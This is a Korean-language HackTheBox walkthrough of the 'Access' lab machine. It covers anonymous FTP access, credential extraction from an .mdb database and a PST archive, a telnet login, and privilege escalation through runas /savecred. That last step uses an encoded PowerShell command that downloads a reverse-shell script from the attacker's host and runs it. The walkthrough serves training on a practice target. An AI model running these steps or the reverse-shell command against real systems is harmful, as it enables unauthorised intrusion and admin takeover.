# Access - HackTheBox
## Recon
```bash
sudo nmap -p 21,23,80 -sC -sV -vv -oA access 10.10.10.98
```
<img width="1105" height="416" alt="image" src="https://github.com/user-attachments/assets/37c506ab-1d09-4985-89f4-a3d2ad3565d8" />

- FTP(21)
- TELNET(23)
- HTTP(80)

---
## FTP
- `anonymous`로그인 성공.
```bash
ftp 10.10.10.98
```
<img width="1105" height="117" alt="image" src="https://github.com/user-attachments/assets/4ac44fa8-51d0-499f-893c-f4af9b69c529" />

<br>
<br>

- `/Engineer`경로에서 `Access Control.zip`은 다운로드가 되나, `/Backups`폴더의 `backup.mdb`파일은 다운로드가 오류가 발생.
<img width="1105" height="193" alt="image" src="https://github.com/user-attachments/assets/eb60feaf-f12a-4cdd-8e7f-9e6c84764ddd" />

<br>
<br>

- `wget`을 사용하여 `FTP` 전체 다운로드 시도.
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```
<img width="1105" height="171" alt="image" src="https://github.com/user-attachments/assets/ad835974-e24a-4120-979d-32378228009b" />

<br>
<br>

- 테이블 정보 수집.
```bash
mdb-tables -1 backup.mdb > tables
```
<img width="1105" height="302" alt="image" src="https://github.com/user-attachments/assets/28b1cf37-5dca-4c55-80ba-da93a18a691e" />

<br>
<br>

- 데이터 수집.
```bash
for table in $(cat tables);do mdb-json backup.mdb $table|jq > $table;done;
```
<img width="1105" height="346" alt="image" src="https://github.com/user-attachments/assets/86bf487c-0080-43a0-a54a-d415de2bce39" />

<br>
<br>

- `auth_user`에서 계정 발견.
<img width="1105" height="506" alt="image" src="https://github.com/user-attachments/assets/ad385498-6761-4624-aa2e-6ed60b069d17" />

---
## telnet
- `telnet`에 로그인 시도하였으나 실패.
- `/Engineer`폴더의 `Access Control.zip`을 압축해제하려 했으나 비밀번호가 걸려있음.
<img width="1105" height="326" alt="image" src="https://github.com/user-attachments/assets/1ccee850-bbe1-4b6e-88a5-1bfd33e1fcce" />

<br>
<br>

- https://linux.die.net/man/1/readpst
- `access4u@security`를 사용하여 압축 해제.
- `readpst`를 사용하여 `mbox`확장자로 변환.
```bash
readpst Access\ Control.pst
```
<img width="1105" height="297" alt="image" src="https://github.com/user-attachments/assets/9db059c9-b3b3-457e-89e4-2cafe4a69359" />

<br>
<br>

- `security:4Cc3ssC0ntr0ller`로 비밀번호가 설정되어 있다고 출력.
<img width="1105" height="510" alt="image" src="https://github.com/user-attachments/assets/98a35f63-ea18-4e4e-b857-5ee02741388b" />

<br>
<br>

- `telnet`에 `security:4Cc3ssC0ntr0ller`로 접속.
```bash
telnet 10.10.10.98 23
```
<img width="1105" height="301" alt="image" src="https://github.com/user-attachments/assets/b8538d60-5517-44ca-aa51-6763d2f94b7c" />

---
## Privesc
- `c:\users\public`폴더에서 `desktop`폴더가 숨겨져 있었고 내부에 `ZKAccess3.5 Security System.lnk`파일이 존재.
<img width="1104" height="285" alt="image" src="https://github.com/user-attachments/assets/40386463-c545-4304-9295-825fe768b2d2" />

<br>
<br>

- `lnk`파일 세부정보 확인.
- `runas.exe`를 사용하여 `administrator`유저로 저장된 자격증명을 사용하여 프로그램을 실행시키는 코드.
```powershell
$WScript = New-Object -ComObject WScript.Shell; $SC = Get-ChildItem *.lnk; $WScript.CreateShortcut($sc)
```
<img width="1104" height="355" alt="image" src="https://github.com/user-attachments/assets/7b9c65bb-aed0-4024-979c-e08495ebe665" />

<br>
<br>

- 자격증명 확인.
```powershell
cmdkey /list
```
<img width="1104" height="151" alt="image" src="https://github.com/user-attachments/assets/5b1c196a-63aa-4eb7-8932-9131919c82e5" />

<br>
<br>

- `runas.exe`를 사용하여 리버스 셸을 실행하려 했으나 실패.
- `base64`로 인코딩하여 시도.
```bash
echo -n "iex(new-object net.webclient).downloadstring('http://10.10.16.3/Invoke-PowerShellTcp.ps1')"|iconv --to-code UTF-16LE | base64 -w0
```
<img width="1104" height="123" alt="image" src="https://github.com/user-attachments/assets/909cf411-909b-4591-a72b-19435010d590" />

<br>
<br>

- 리버스 셸 실행.
```powershell
runas.exe /user:access\administrator /savecred "powershell -encodedcommand aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA"
```
<img width="1104" height="79" alt="image" src="https://github.com/user-attachments/assets/5025594f-8e7a-41d4-9ea6-25c4bd52392b" />

<br>
<br>

- `administrator`셸 획득.
<img width="1104" height="195" alt="image" src="https://github.com/user-attachments/assets/628b3b12-acaa-4651-9c16-766327b0e551" />

---
## FLAG
- `c:\users\security\desktop\user.txt`
<img width="1104" height="195" alt="image" src="https://github.com/user-attachments/assets/316adb5a-3776-4f0a-a53c-35f4022fcca5" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1104" height="195" alt="image" src="https://github.com/user-attachments/assets/84126ce8-70ad-476a-9f13-d1558d2f3943" />
